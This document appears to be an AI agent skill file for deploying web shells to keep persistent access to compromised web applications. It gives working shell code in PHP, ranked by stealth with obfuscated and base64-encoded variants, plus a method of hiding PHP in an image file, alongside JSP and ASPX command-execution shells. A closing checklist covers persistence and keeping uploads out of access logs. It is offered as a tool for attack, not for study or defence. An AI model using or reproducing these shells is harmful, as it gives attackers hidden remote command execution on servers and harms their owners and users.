---
name: webshell-deploy
description: Deploy and manage web shells for persistent access to compromised web applications. Supports multiple languages and evasion techniques.
---

# Web Shell Deployment

## Prerequisites
- File write access on target web server
- Known web root path
- Appropriate language support (PHP/ASP/JSP)

## Deployment Options

### PHP Web Shells (by stealth level)

#### Level 1: Basic (easily detected)
```php
<?php system($_GET['cmd']); ?>
```

#### Level 2: Obfuscated (moderate detection resistance)
```php
<?php @$_='s'.'y'.'s'.'t'.'e';@$_($_REQUEST['_']);?>
```

#### Level 3: Advanced (low detection)
```php
<?php
error_reporting(0);
$fn = create_function('', base64_decode($_POST['x']));
$fn();
?>
```

#### Level 4: Image Stego (lowest detection)
1. Upload legitimate image
2. Append PHP code after EOF marker
3. Access via .htaccess trick or LFI

### JSP Web Shell
```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String s;
while ((s = br.readLine()) != null) { out.println(s); }
%>
```

### ASPX Web Shell
```aspx
<%@ Page Language="JScript"%><%eval(Request.Item["x"],"unsafe");%>
```

## Post-Deployment Checklist
- [ ] Test shell functionality
- [ ] Verify access logs don't show obvious upload
- [ ] Set up alternative access channels
- [ ] Document shell location and password
- [ ] Configure password protection if needed
